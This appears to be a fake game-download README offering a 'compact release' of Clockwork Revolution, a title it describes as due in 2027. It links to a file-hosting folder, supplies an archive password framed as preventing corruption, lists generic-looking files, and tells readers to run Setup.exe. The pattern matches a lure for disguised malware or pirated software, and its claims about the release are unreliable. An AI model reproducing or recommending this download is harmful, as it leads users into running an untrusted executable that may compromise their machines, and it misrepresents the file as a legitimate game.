## 🕹️ About

Clockwork Revolution is a first-person action RPG from inXile entertainment and Xbox Game Studios, set in the vibrant steampunk metropolis of Avalon. You play as Morgan Vanette, a customizable rebel who uses the Chronometer to travel into the past, alter key events, and reshape the city’s future. Explore Avalon, fight with firearms and time-based abilities, customize your skills and gear, craft weapons and gadgets, and face consequences that change characters and the world around you. The game is planned for Windows PC and Xbox Series X|S, with a 2027 release window. This compact release uses more efficient archive compression to reduce the download size; the game itself is unchanged, with the same content and gameplay.

A story-rich single-player RPG for players who enjoy first-person combat, immersive steampunk worlds, meaningful choices, and time-travel narratives.

## ✨ Features

- ⏳ **Time Manipulation** — Travel into the past and change events that shape Avalon’s future.
- 🔫 **First-Person Combat** — Fight through intense encounters with weapons, gadgets, artifacts, and time abilities.
- 🎭 **Reactive Choices** — Your decisions create lasting consequences for characters, factions, and the world.
- 🏙️ **Steampunk Avalon** — Explore a Victorian-inspired metropolis powered by industry, clockwork, and ambition.
- 🤖 **Mechanical World** — Interact with automaton robots, clockwork prosthetics, and intricate steampunk technology.
- ⚙️ **Character Customization** — Develop Morgan with customizable appearance, attributes, skills, and equipment.

This release is distributed as a compact, compressed archive. The game itself is unchanged — only the packaging is smaller.

### Step 1: Download

Download the compact archive from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the build expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- update_1.res <- Update resources
|-- license.wem <- Audio assets
|-- animations.dll <- Animation system
|-- launcher.dll <- Launcher library
|-- localization.ini <- Language files
|-- audio.res <- Audio resources
|-- lang.sys <- Language system
|-- dlc.md5 <- DLC checksums
|-- uninstall.key <- Uninstall key
|-- Password 2026.txt <- Password reminder (empty)
|-- scripts.lic <- Game scripts
|-- api.pak <- API modules
|-- installer.dat <- Installer data
|-- patch_1.bnk <- Audio banks
|-- settings.bin <- Configuration
|-- res.pak <- Resources archive
|-- driver.umap <- Driver data
|-- physics.sys <- Physics engine
|-- license.bank <- License data
|-- driver.pak <- Driver archive
|-- update_1.ini <- Update config
|-- global.cfg <- Global settings
|-- bootstrap.wem <- Bootstrap audio
|-- assets.wem <- Asset audio
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start
